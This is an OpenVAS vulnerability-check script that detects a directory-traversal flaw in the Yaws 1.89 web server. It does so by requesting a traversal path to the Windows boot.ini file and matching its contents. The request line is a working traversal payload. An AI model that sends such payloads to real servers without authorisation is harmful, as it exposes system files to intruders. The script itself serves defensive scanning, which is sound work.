###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_yaws_44564.nasl 6696 2017-07-12 11:30:15Z cfischer $
#
# Yaws URI Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Yaws is prone to a directory-traversal vulnerability because it fails
to sufficiently sanitize user-supplied input.

Exploiting this issue may allow an attacker to obtain sensitive
information that could aid in further attacks.

Yaws 1.89 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100887);
 script_version("$Revision: 6696 $");
 script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:30:15 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2010-11-02 13:46:58 +0100 (Tue, 02 Nov 2010)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-4181");
 script_bugtraq_id(44564);

 script_name("Yaws URI Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44564");
 script_xref(name : "URL" , value : "http://yaws.hyber.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 8080);
 script_mandatory_keys("Yaws/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:8080);

banner = get_http_banner(port:port);
if(!banner || "Server: Yaws/" >!< banner)exit(0);

url = string("/.\\..\\.\\..\\.\\..\\boot.ini"); 

if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
